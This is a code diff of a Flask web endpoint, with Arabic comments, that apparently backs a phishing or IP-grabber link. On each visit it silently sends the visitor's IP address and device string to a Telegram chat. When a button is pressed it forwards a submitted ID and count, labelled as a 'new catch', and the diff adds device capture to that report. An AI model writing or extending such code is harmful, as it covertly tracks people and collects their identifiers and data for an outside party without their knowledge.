@@ -13,21 +13,21 @@ def send_to_telegram(text):
 @app.route('/api/index', methods=['GET', 'POST'])
 def handler():
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown Device')
     
     if request.method == 'GET':
-        # هذا اللي يرسل بمجرد الدخول (Trace Visit)
-        user_agent = request.headers.get('User-Agent')
-        msg = f"🔔 **دخل الروابط الحين!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
+        # عند دخول الرابط
+        msg = f"🔔 **دخل الرابط الحين!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
         send_to_telegram(msg)
         return "ok"
     
     else:
-        # هذا اللي يرسل لما يضغط الزر (Log Data)
+        # عند ضغط الزر وإرسال البيانات
         data = request.json
         mode = data.get('mode')
         t_id = data.get('id')
         t_count = data.get('count')
         
-        msg = f"🎯 **صيد جديد من {mode}**\n\n🌐 IP: `{user_ip}`\n🆔 الآيدي: `{t_id}`\n🔢 العدد: `{t_count}`"
+        msg = f"🎯 **صيد جديد!**\n\n🔹 القسم: {mode}\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`\n🔑 البيانات: `{t_id}`\n🔢 العدد المطلوب: `{t_count}`"
         send_to_telegram(msg)
         return jsonify({"status": "ok"})
